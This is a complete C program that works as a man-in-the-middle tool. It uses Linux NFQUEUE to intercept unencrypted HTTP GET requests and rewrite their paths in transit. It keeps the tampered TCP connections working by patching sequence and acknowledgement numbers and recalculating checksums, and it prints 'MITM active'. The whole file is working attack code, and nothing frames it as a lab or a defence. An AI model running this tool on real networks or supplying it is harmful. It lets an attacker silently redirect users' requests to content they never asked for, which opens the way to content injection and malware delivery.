#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>

/* ---- Connection tracking ---- */

#define MAX_CONNS 256

typedef struct {
    uint32_t cip, sip;   /* client / server IP (network byte order) */
    uint16_t cport, sport;
    int32_t  delta;      /* cumulative extra bytes we've injected so far */
    int      used;
} conn_t;

static conn_t table[MAX_CONNS];

/* Returns entry and sets *dir: +1 = client→server, -1 = server→client */
static conn_t *find_conn(uint32_t sip, uint16_t sport,
                          uint32_t dip, uint16_t dport, int *dir)
{
    for (int i = 0; i < MAX_CONNS; i++) {
        if (!table[i].used) continue;
        if (table[i].cip == sip && table[i].cport == sport &&
            table[i].sip == dip && table[i].sport == dport)
            { *dir = 1; return &table[i]; }
        if (table[i].sip == sip && table[i].sport == sport &&
            table[i].cip == dip && table[i].cport == dport)
            { *dir = -1; return &table[i]; }
    }
    return NULL;
}

static conn_t *add_conn(uint32_t cip, uint16_t cport,
                         uint32_t sip, uint16_t sport)
{
    for (int i = 0; i < MAX_CONNS; i++) {
        if (!table[i].used) {
            table[i] = (conn_t){ .cip=cip, .sip=sip, .cport=cport, .sport=sport, .delta=0, .used=1 };
            return &table[i];
        }
    }
    fprintf(stderr, "Connection table full\n");
    return NULL;
}

/* ---- Checksums ---- */

static uint16_t inet_cksum(const void *data, int len)
{
    const uint16_t *p = data;
    uint32_t sum = 0;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return ~sum;
}

static void fix_ip_cksum(struct iphdr *ip)
{
    ip->check = 0;
    ip->check = inet_cksum(ip, ip->ihl * 4);
}

static void fix_tcp_cksum(struct iphdr *ip, uint8_t *tcp_start, int tcp_len)
{
    /* Zero the checksum field (bytes 16-17 of TCP header) */
    tcp_start[16] = 0;
    tcp_start[17] = 0;
    struct { uint32_t s, d; uint8_t z, p; uint16_t l; }
        ph = { ip->saddr, ip->daddr, 0, IPPROTO_TCP, htons(tcp_len) };
    uint32_t sum = 0;
    const uint16_t *ptr = (const void *)&ph;
    for (int i = 0; i < (int)(sizeof(ph) / 2); i++) sum += ptr[i];
    ptr = (const void *)tcp_start;
    int r = tcp_len;
    while (r > 1) { sum += *ptr++; r -= 2; }
    if (r) sum += *(const uint8_t *)ptr;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    uint16_t cksum = ~sum;
    memcpy(tcp_start + 16, &cksum, 2);
}

/* ---- NFQUEUE callback ---- */

struct ctx { const char *from; const char *to; int flen; int tlen; };

static int packet_cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
                     struct nfq_data *nfad, void *ud)
{
    (void)nfmsg;
    struct ctx *ctx = ud;
    uint32_t id = ntohl(nfq_get_msg_packet_hdr(nfad)->packet_id);

    unsigned char *pkt;
    int pkt_len = nfq_get_payload(nfad, &pkt);
    if (pkt_len < 40)
        return nfq_set_verdict2(qh, id, NF_ACCEPT, 1, 0, NULL);

    struct iphdr  *ip  = (struct iphdr *)pkt;
    if (ip->protocol != IPPROTO_TCP)
        return nfq_set_verdict2(qh, id, NF_ACCEPT, 1, 0, NULL);

    int ip_hlen  = ip->ihl * 4;
    int ip_total = ntohs(ip->tot_len);
    uint8_t *tcp  = pkt + ip_hlen;
    int tcp_hlen  = (tcp[12] >> 4) * 4;
    int tcp_len   = ip_total - ip_hlen;
    uint8_t *http = tcp + tcp_hlen;
    int http_len  = tcp_len - tcp_hlen;

    uint16_t sport = (uint16_t)(tcp[0] << 8 | tcp[1]);
    uint16_t dport = (uint16_t)(tcp[2] << 8 | tcp[3]);

    int dir = 0;
    conn_t *conn = find_conn(ip->saddr, sport, ip->daddr, dport, &dir);

    /* FIN/RST: drop tracking state and let the packet through */
    if (tcp[13] & 0x05) { /* FIN=0x01, RST=0x04 */
        if (conn) conn->used = 0;
        return nfq_set_verdict2(qh, id, NF_ACCEPT, 1, 0, NULL);
    }

    /* Nothing to do for untracked connections with no HTTP payload */
    if (!conn && http_len < 5)
        return nfq_set_verdict2(qh, id, NF_ACCEPT, 1, 0, NULL);

    /* Working copy — extra 512 bytes headroom for path expansion */
    static unsigned char buf[65536 + 512];
    memcpy(buf, pkt, pkt_len);
    struct iphdr *nip  = (struct iphdr *)buf;
    uint8_t      *ntcp = buf + ip_hlen;
    int new_len = pkt_len;
    int dirty   = 0;

    /*
     * Step 1 — patch SEQ / ACK for already-tracked connections.
     *
     * For client→server packets: the client's SEQ is still in its own
     * sequence space (unaware of our extra bytes), so we add the delta.
     *
     * For server→client packets: the server's ACK reflects the extra
     * bytes it received, but the client doesn't know about them, so we
     * subtract the delta.
     */
    if (conn && conn->delta) {
        if (dir == 1) {
            uint32_t seq;
            memcpy(&seq, ntcp + 4, 4);
            seq = htonl(ntohl(seq) + conn->delta);
            memcpy(ntcp + 4, &seq, 4);
            dirty = 1;
        } else if (dir == -1) {
            uint32_t ack;
            memcpy(&ack, ntcp + 8, 4);
            ack = htonl(ntohl(ack) - conn->delta);
            memcpy(ntcp + 8, &ack, 4);
            dirty = 1;
        }
    }

    /*
     * Step 2 — rewrite GET /from_path on client→server packets.
     *
     * We do this AFTER applying the existing delta so the SEQ is already
     * correct for this segment; the new delta from this rewrite will apply
     * to the *next* packet.
     */
    if ((dir == 1 || dir == 0) && http_len >= 5 &&
        memcmp(http, "GET ", 4) == 0)
    {
        /* http still points into pkt; same offset inside buf: */
        uint8_t *path_n = buf + (http - pkt) + 4;
        uint8_t *pend_n = memchr(path_n, ' ', http_len - 4);

        if (pend_n) {
            int alen = pend_n - path_n;
            if (alen == ctx->flen && memcmp(path_n, ctx->from, ctx->flen) == 0) {
                int delta = ctx->tlen - ctx->flen;
                int tail  = (buf + pkt_len) - pend_n;

                /* Shift everything after the path end, then write new path */
                memmove(pend_n + delta, pend_n, tail);
                memcpy(path_n, ctx->to, ctx->tlen);

                new_len      += delta;
                nip->tot_len  = htons(ip_total + delta);

                if (!conn)
                    conn = add_conn(ip->saddr, sport, ip->daddr, dport);
                if (conn) conn->delta += delta;

                printf("[sport=%u] GET %s → %s  (cumulative delta=%+d)\n",
                       sport, ctx->from, ctx->to,
                       conn ? conn->delta : delta);
                dirty = 1;
            }
        }
    }

    if (!dirty)
        return nfq_set_verdict2(qh, id, NF_ACCEPT, 1, 0, NULL);

    fix_ip_cksum(nip);
    fix_tcp_cksum(nip, ntcp, new_len - ip_hlen);

    return nfq_set_verdict2(qh, id, NF_ACCEPT, 1, new_len, buf);
}

/* ---- main ---- */

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <from_path> <to_path>\n", argv[0]);
        return 1;
    }

    struct ctx ctx = {
        .from = argv[1], .flen = strlen(argv[1]),
        .to   = argv[2], .tlen = strlen(argv[2]),
    };

    printf("MITM active: GET %s → GET %s\n", ctx.from, ctx.to);

    struct nfq_handle   *h  = nfq_open();
    if (!h) { perror("nfq_open"); return 1; }

    if (nfq_bind_pf(h, AF_INET) < 0) { perror("nfq_bind_pf"); return 1; }

    struct nfq_q_handle *qh = nfq_create_queue(h, 0, &packet_cb, &ctx);
    if (!qh) { perror("nfq_create_queue"); return 1; }

    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
        perror("nfq_set_mode"); return 1;
    }

    unsigned char buf[65536] __attribute__((aligned(8)));
    int fd = nfq_fd(h), rv;
    while ((rv = recv(fd, buf, sizeof(buf), 0)) > 0)
        nfq_handle_packet(h, (char *)buf, rv);

    nfq_destroy_queue(qh);
    nfq_close(h);
    return 0;
}
